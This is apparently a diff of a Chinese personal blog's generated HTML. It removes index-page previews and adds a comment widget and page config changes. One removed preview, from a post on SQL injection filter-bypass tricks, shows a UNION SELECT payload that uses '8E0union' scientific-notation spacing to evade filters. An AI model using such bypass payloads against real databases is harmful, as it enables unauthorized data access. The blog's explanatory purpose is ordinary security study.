-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8E0</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">8.0</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/2021/01/07/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/01/07/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-linux、docker、git遇到的一些问题" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/05/linux%E3%80%81docker%E3%80%81git%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/">linux、docker、git遇到的一些问题</a>
-    </h1>
-  
-
-        
-        
-<a href="/2020/12/05/linux%E3%80%81docker%E3%80%81git%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/" class="archive-article-date">
-  	<time datetime="2020-12-05T10:21:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-05</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="linux、docker、git遇到的一些问题"><a href="#linux、docker、git遇到的一些问题" class="headerlink" title="linux、docker、git遇到的一些问题"></a>linux、docker、git遇到的一些问题</h1><p>最近在使用kali、docker、git的过程中遇到了一下问题总结下来。</p>
-        
-          <a class="article-more-a" href="/2020/12/05/linux%E3%80%81docker%E3%80%81git%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/12/05/linux%E3%80%81docker%E3%80%81git%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
-    </nav>
+  
+
+  
+  <div id="SOHUCS" sid="Python学习" ></div> 
+<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
+<script type="text/javascript">
+    window.changyan.api.config({
+        appid: "true",
+        conf: "true"
+    });
+</script>
+</script>
+  
+
+  
+
   
 
 
@@ -913,8 +374,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
